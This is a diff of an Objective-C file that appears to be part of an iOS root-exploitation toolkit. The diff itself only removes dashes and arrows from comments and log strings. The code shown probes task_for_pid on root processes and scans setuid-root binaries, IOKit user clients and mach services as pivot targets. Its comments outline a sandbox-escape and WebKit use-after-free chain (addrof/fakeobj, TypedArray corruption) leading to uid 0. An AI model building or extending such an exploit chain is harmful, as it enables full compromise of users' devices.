@@ -32,14 +32,14 @@ extern kern_return_t mach_vm_read_overwrite(vm_map_t t, mach_vm_address_t a,
                                             mach_vm_size_t *out);
 extern kern_return_t mach_vm_write(vm_map_t t, mach_vm_address_t a, vm_offset_t d,
                                    mach_vm_size_t sz);
- — every module below is a step that logically leads to uid 0.
+  every module below is a step that logically leads to uid 0.
 // Group A: task/credential surface
 // ===========================================================================
 
 // --- task_for_pid on root processes ----------------------------------------
 // security.mac.task_for_pid_allow is 1 on this build (Developer Mode).  If we can
 // take the task port of a root-owned process we can read/write ITS memory with
-// mach_vm_* under its privileges, and drive it with thread_create — the practical
+// mach_vm_* under its privileges, and drive it with thread_create  the practical
 // step from "app with a sandbox escape" to "code running as root".
 NSString *ModTaskForPid(void) {
     AveLog(@"    task_for_pid: sweeping pids (Developer Mode allows task_for_pid)");
@@ -92,14 +92,14 @@ NSString *ModSetuidScan(void) {
         closedir(d);
     }
     if (found) AveSetStatus([NSString stringWithFormat:@"%d setuid-root binaries visible", found]);
-    return S(@"setuid scan: %d root binaries reachable — try input-controlled ones first", found);
+    return S(@"setuid scan: %d root binaries reachable  try input-controlled ones first", found);
 }
 
 // --- IOKit user-client classes reachable from the app sandbox --------------
 // Public measurement (exploitreversing ER-10, iOS 26/27): the app sandbox can
 // open ~147 objects across 17 driver classes; type-0 openable includes
 // AppleKeyStore, IOSurfaceRoot, AppleJPEGDriver, AppleM2ScalerCSCDriver,
-// AppleCLCD2 — each is a kernel attack surface with a known bug class.
+// AppleCLCD2  each is a kernel attack surface with a known bug class.
 NSString *ModIOKitReachable(void) {
     struct { const char *cls; } C[] = {
         {"AppleKeyStore"}, {"IOSurfaceRoot"}, {"AppleJPEGDriver"},
@@ -187,12 +187,12 @@ NSString *ModMachLookupSweep(void) {
             mach_port_deallocate(mach_task_self(), sp);
         }
     }
-    return S(@"daemon surface: %d/%d services answering — each is a pivot candidate",
+    return S(@"daemon surface: %d/%d services answering  each is a pivot candidate",
              open_, (int)(sizeof(S)/sizeof(S[0])));
 }
 
 // ===========================================================================
-// Group C: container write → daemon pivot
+// Group C: container write  daemon pivot
 // ===========================================================================
 NSString *ModContainerPivot(void) {
     // With worse_query/bad_query we can place files inside other containers.
@@ -217,7 +217,7 @@ NSString *ModContainerPivot(void) {
 }
 
 // ===========================================================================
-// Group D: JSC / WebKit chain (arbitrary R/W → native code exec)
+// Group D: JSC / WebKit chain (arbitrary R/W  native code exec)
 // ===========================================================================
 // The UAF gives addrof/fakeobj; the next step is discovering a usable structure
 // ID and then corrupting a real TypedArray's length through a fake-object alias.
